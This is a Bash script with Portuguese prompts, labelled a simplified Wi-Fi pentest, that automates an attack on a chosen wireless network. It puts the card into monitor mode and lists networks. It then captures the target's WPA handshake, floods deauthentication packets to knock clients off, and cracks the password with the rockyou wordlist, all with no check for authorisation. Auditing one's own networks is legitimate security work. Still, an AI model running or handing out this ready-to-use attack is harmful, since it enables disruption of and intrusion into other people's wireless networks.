#!/bin/bash

clear
echo "===== PENTEST WI-FI SIMPLIFICADO ====="
echo ""

# Lista interfaces
echo "[+] Interfaces disponíveis:"
ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
echo ""
read -p "Digite a interface (ex: wlan0): " INTERFACE

# Verifica interface
if ! ip link show $INTERFACE &> /dev/null; then
    echo "[ERRO] Interface $INTERFACE não existe!"
    exit 1
fi

# Ativa modo monitor (sem adicionar 'mon')
echo ""
echo "[+] Ativando modo monitor..."
sudo airmon-ng check kill &> /dev/null
sudo airmon-ng start $INTERFACE &> /dev/null

# Lista redes
echo ""
echo "[+] Listando redes (Ctrl+C para parar)..."
sudo airodump-ng $INTERFACE

# Inputs do usuário
echo ""
read -p "Digite o BSSID alvo (MAC): " BSSID
read -p "Digite o canal: " CHANNEL
read -p "Nome do arquivo .cap (sem extensão): " FILE_NAME
read -p "MAC do cliente específico (ou deixe em branco): " CLIENT_MAC

# Captura handshake
echo ""
echo "[+] Iniciando captura em: $(pwd)/${FILE_NAME}.cap"
xterm -e "sudo airodump-ng --bssid $BSSID -c $CHANNEL -w $FILE_NAME $INTERFACE" &

# Ataque deauth
echo ""
read -p "Quantos pacotes de deauth? (0=contínuo): " PACKETS
if [ -z "$CLIENT_MAC" ]; then
    xterm -e "sudo aireplay-ng --deauth $PACKETS -a $BSSID $INTERFACE" &
else
    xterm -e "sudo aireplay-ng --deauth $PACKETS -a $BSSID -c $CLIENT_MAC $INTERFACE" &
fi

# Opção de brute force
echo ""
read -p "Deseja quebrar a senha agora? (s/n): " BRUTE
if [[ $BRUTE =~ [sS] ]]; then
    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
        echo "[+] Descompactando rockyou.txt..."
        sudo gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
    fi
    if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
        echo "[+] Iniciando brute force com rockyou.txt..."
        sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt ${FILE_NAME}-01.cap
    else
        echo "[ERRO] rockyou.txt não encontrado em /usr/share/wordlists/"
    fi
fi

# Limpeza
echo ""
echo "[+] Restaurando interface..."
sudo airmon-ng stop $INTERFACE &> /dev/null
sudo ifconfig $INTERFACE down
sudo macchanger -p $INTERFACE &> /dev/null
sudo ifconfig $INTERFACE up
